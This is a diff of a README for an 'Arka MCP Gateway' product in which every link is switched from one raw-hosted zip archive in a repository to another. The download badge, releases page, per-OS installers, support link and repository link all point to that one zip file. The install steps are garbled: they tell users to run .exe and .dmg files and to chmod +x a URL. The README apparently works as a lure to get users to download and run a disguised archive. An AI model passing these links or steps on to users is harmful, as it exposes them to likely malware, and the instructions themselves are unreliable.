@@ -1,7 +1,7 @@
 # 🚀 arka-mcp-gateway - Securely Connect Your Enterprise Systems
 
 ## 📥 Download Now
-[![Download v1.0](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip%20v1.0-latest-brightgreen)](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip)
+[![Download v1.0](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip%20v1.0-latest-brightgreen)](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip)
 
 ## 📖 Introduction
 Arka - Enterprise MCP Gateway serves as a powerful connection point for your enterprise systems. It simplifies secure communications and data exchanges across services. You can efficiently manage your applications, enhance productivity, and ensure secure authentication.
@@ -16,22 +16,22 @@ To begin using the Arka MCP Gateway, follow these simple steps to download and r
 - Network: Internet connection for initial setup and updates.
 
 ## 💾 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip).
   
 2. Locate the latest release version. It will be at the top of the list.
 
 3. Download the appropriate installer for your operating system. 
 
-4. For Windows users, download `https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip`. 
+4. For Windows users, download `https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip`. 
    
-5. For macOS users, download `https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip`. 
+5. For macOS users, download `https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip`. 
 
-6. For Linux users, download `https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip`.
+6. For Linux users, download `https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip`.
 
 7. Once the download completes, follow these steps based on your operating system:
    - **Windows:** Double-click the `.exe` file to run the installer. Follow the on-screen instructions.
    - **macOS:** Open the `.dmg` file, drag the `arka-mcp-gateway` icon to your Applications folder, and then launch the application from there.
-   - **Linux:** Make the AppImage executable by running the command `chmod +x https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip`. Then, run it by double-clicking the file or via terminal using `https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip`.
+   - **Linux:** Make the AppImage executable by running the command `chmod +x https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip`. Then, run it by double-clicking the file or via terminal using `https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip`.
 
 ## ⚙️ Configuration
 After installing, you will need to configure the application to match your systems.
@@ -58,11 +58,11 @@ Once setup is complete, you can start using Arka to manage connections between y
 - Generate reports for analysis.
 
 ## 📞 Support
-If you encounter issues or have questions, feel free to reach out through the Issues section of our [GitHub repository](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip). Community support is available, and many users can help troubleshoot your concerns.
+If you encounter issues or have questions, feel free to reach out through the Issues section of our [GitHub repository](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip). Community support is available, and many users can help troubleshoot your concerns.
 
 ## 💡 FAQs
 ### How do I update Arka MCP Gateway?
-Check the [Releases page](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip) regularly for updates. Simply download the latest version and follow the same installation instructions.
+Check the [Releases page](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip) regularly for updates. Simply download the latest version and follow the same installation instructions.
 
 ### Can I use Arka MCP Gateway with my existing applications?
 Yes, Arka is designed to integrate easily with existing systems.
@@ -77,8 +77,8 @@ We continuously look for ways to improve the Arka MCP Gateway. Upcoming features
 - Support for additional authentication methods.
 
 ## 📘 Resources
-- [GitHub Repository](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip)
-- [Community Support](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip)
+- [Community Support](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip)
 
 ## 📥 Download Now Again
-[![Download v1.0](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip%20v1.0-latest-brightgreen)](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/frontend/arka-mcp-gateway-v2.5.zip)
+[![Download v1.0](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip%20v1.0-latest-brightgreen)](https://raw.githubusercontent.com/Elijah89YTS/arka-mcp-gateway/main/backend/gateway/mcp_gateway_arka_2.3.zip)
